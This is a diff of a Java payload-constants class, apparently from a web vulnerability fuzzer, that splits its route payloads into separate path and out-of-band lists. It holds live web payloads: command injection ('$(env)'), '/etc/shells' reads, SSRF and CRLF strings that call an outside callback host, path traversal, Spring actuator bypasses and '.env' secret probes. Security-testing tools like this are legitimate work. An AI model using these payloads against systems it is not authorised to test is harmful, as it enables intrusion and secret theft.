@@ -26,11 +26,11 @@ public class PayloadConstants {
      * 8K固定字符串用于随机测试
      */
     public static final String FIXED_8K_STRING = FixedStrings.FIXED_8K_STRING;
+
     /**
      * Header模糊测试专用的payload列表
      */
     public static final List<PayloadInfo> HEADER_PAYLOAD_INFOS = Arrays.asList(
-//            new PayloadInfo("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999", "99999"),
             new PayloadInfo("//etc/shells", "//etc/shells"),
             new PayloadInfo("$(env)", "$(env)"),
             new PayloadInfo("{fuzz}.ssrf.tejq8.zcyy.fun", "{fuzz}.ssrf.tejq8.zcyy.fun"),
@@ -79,14 +79,12 @@ public class PayloadConstants {
             new PayloadInfo("*", "*"),
             new PayloadInfo("+", "+"),
             new PayloadInfo(";", ";"),
-            // 字符串形式（适用于GET、POST、JSON字符串）
             new PayloadInfo("%3f", "?(%3f)"),
             new PayloadInfo("#", "#"),
             new PayloadInfo("?", "?"),
             new PayloadInfo("{param}#", "{param}#"),
             new PayloadInfo("{param}&chaxx=xx", "{param}&norandom=xx"),
             new PayloadInfo("{param_url_encoded}", "{url_encoded}"),
-//            new PayloadInfo("chaxx123'\">", "chaxx123'\">"),
             new PayloadInfo("/{param}", "/{param}"),
             new PayloadInfo("%2f{param}", "%2f{param}"),
             new PayloadInfo("./{param}", "./{param}"),
@@ -103,7 +101,6 @@ public class PayloadConstants {
             new PayloadInfo("{random_8000}", "{random_8000}"),
             new PayloadInfo("{param}%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%206", "{param}CRLF"),
             new PayloadInfo("{param_double_url_encoded}", "{double_url_encoded}"),
-//            new PayloadInfo("{path_double_url_encoded}", "{double_url_encoded}"),
             new PayloadInfo("{param}%2f..", "{param}%2f.."),
             new PayloadInfo("{param}/..", "{param}/.."),
             new PayloadInfo("{param}%252f..", "{param}%252f.."),
@@ -127,18 +124,12 @@ public class PayloadConstants {
     );
 
     /**
-     * 路由模糊测试专用的payload列表
-     * 注意：这些是默认值，实际使用时应该通过PayloadManager获取启用的payloads
-     *
-     * ROUTE12类型payload（在ROUTE1和ROUTE2标签页中都显示）:
-     * - "chaxx123" -> "chaxx"
-     * - "{path}/chaxx" -> "{path}/chaxx"
+     * PathFuzzer 使用的路由模糊测试 payload 列表
+     * 保留了除 Spring、信息泄露、Rewrite 和 {sub../} 之外的所有 payload
      */
     public static final List<PayloadInfo> ROUTE_PAYLOAD_INFOS = Arrays.asList(
-            new PayloadInfo("chaxx123", "chaxx"),                              // ROUTE12
-            new PayloadInfo("null", "null"),                              // ROUTE12
-            // 其他ROUTE类型payload
-//            new PayloadInfo("chaxx123'\">", "chaxx123'\">"),
+            new PayloadInfo("chaxx123", "chaxx"),
+            new PayloadInfo("null", "null"),
             new PayloadInfo(".", "."),
             new PayloadInfo("%23", "#"),
             new PayloadInfo("%5c", "\\"),
@@ -149,21 +140,10 @@ public class PayloadConstants {
             new PayloadInfo("{path}..", "{path}.."),
             new PayloadInfo("{path1}{path2}", "{path1}{path2}"),
             new PayloadInfo("{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%204", "{path}CRLF"),
-            new PayloadInfo("{path}/chaxx", "{path}/chaxx"),                   // ROUTE12
+            new PayloadInfo("{path}/chaxx", "{path}/chaxx"),
             new PayloadInfo("{path}/%20H", "ng crlf"),
             new PayloadInfo("{path}/%20HTTP/19.91%0D%0Ac9w:%20x", "ng crlf2"),
             new PayloadInfo("{path}/%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%209", "ng crlf3"),
-//            new PayloadInfo("{path_del}", "{path_del}"), // 新增：删除当前路径段的payload
-//            new PayloadInfo("{path}#", "{path}#"),
-//            new PayloadInfo("{path}%23", "{path}%23"),
-//            new PayloadInfo("{path}?", "{path}?"),
-//            new PayloadInfo("{path}%3f", "{path}%3f"),
-//            new PayloadInfo("{path_url_encoded}", "{url_encoded}"),
-//            new PayloadInfo("/{path}", "/{path}"),
-//            new PayloadInfo("%2f{path}", "%2f{path}"),
-//            new PayloadInfo("./{path}", "./{path}"),
-//            new PayloadInfo("%2e%2f{path}", "%2e%2f{path}"),
-//            new PayloadInfo("{path}%2f..%2f{path}", "{path}%2f..%2f{path}"),
             new PayloadInfo("{path_double_url_encoded}", "{double_url_encoded}"),
             new PayloadInfo("{path}%2f..", "{path}%2f.."),
             new PayloadInfo("{path}/..", "{path}/.."),
@@ -184,9 +164,15 @@ public class PayloadConstants {
             new PayloadInfo("{path}/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E", "{path}/%2E%2EX8"),
             new PayloadInfo("{path}%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "{path}%2F%2E%2EX8"),
             new PayloadInfo("{path}//..//..//..//..//..//..//..//..", "{path}//..X8"),
-            new PayloadInfo("{path}%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..", "{path}%2f%2f..X8"),
+            new PayloadInfo("{path}%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..", "{path}%2f%2f..X8")
+    );
 
-            // --- 新增 Spring 类路径 Payload ---
+    /**
+     * OOBFuzzer 使用的路由模糊测试 payload 列表
+     * 包含 Spring、信息泄露、Rewrite 和 {sub../} 相关的 payload
+     */
+    public static final List<PayloadInfo> OOB_ROUTE_PAYLOAD_INFOS = Arrays.asList(
+            // --- Spring 类路径 Payload ---
             new PayloadInfo("swagger", "swagger"),
             new PayloadInfo("swagger-resources", "swagger2"),
             new PayloadInfo("api_docs", "api_docs"),
@@ -248,7 +234,7 @@ public class PayloadConstants {
             new PayloadInfo(";/..;/..;/..;/metrics", ";/..;/..;/..;/metrics"),
             new PayloadInfo(";/..;/..;/..;/jolokia", ";/..;/..;/..;/jolokia"),
 
-            // --- 新增 Spring 类 URL Rewrite Payload ---
+            // --- Spring 类 URL Rewrite Payload ---
             new PayloadInfo("swagger", "swagger-rewrite"),
             new PayloadInfo("swagger-resources", "swagger2-rewrite"),
             new PayloadInfo("api_docs", "api_docs-rewrite"),
@@ -262,7 +248,7 @@ public class PayloadConstants {
             new PayloadInfo("metrics", "metrics-rewrite"),
             new PayloadInfo("jolokia", "jolokia-rewrite"),
 
-            // --- 新增 通用框架信息泄露探测 Payload ---
+            // --- 通用框架信息泄露探测 Payload ---
             new PayloadInfo(".env", ".env"),
             new PayloadInfo(".env.local", ".env.local"),
             new PayloadInfo(".env.prod", ".env.prod"),
@@ -281,7 +267,7 @@ public class PayloadConstants {
             new PayloadInfo("_fragment", "_fragment"),
             new PayloadInfo("_profiler", "_profiler"),
 
-            // --- 新增 {sub../} 特殊逻辑 Payload ---
+            // --- {sub../} 特殊逻辑 Payload ---
             new PayloadInfo("{sub../}.env", "{sub../}.env"),
             new PayloadInfo("{sub../}.env.local", "{sub../}.env.local"),
             new PayloadInfo("{sub../}.env.prod", "{sub../}.env.prod"),
@@ -300,7 +286,7 @@ public class PayloadConstants {
             new PayloadInfo("{sub../}_fragment", "{sub../}_fragment"),
             new PayloadInfo("{sub../}_profiler", "{sub../}_profiler"),
 
-            // --- 新增 通用框架信息泄露探测 URL Rewrite Payload ---
+            // --- 通用框架信息泄露探测 URL Rewrite Payload ---
             new PayloadInfo(".env", ".env-rewrite"),
             new PayloadInfo(".env.local", ".env.local-rewrite"),
             new PayloadInfo(".env.prod", ".env.prod-rewrite"),
@@ -327,6 +313,7 @@ public class PayloadConstants {
         private static final ThreadLocal<Random> RANDOM = ThreadLocal.withInitial(Random::new);
         private static final String HASH_CHARS = "0123456789abcdefghijklmnopqrstuvwxyz";
         private static final int HASH_LENGTH = 5;
+
         /**
          * 生成随机hash字符串用于{fuzz}替换
          */
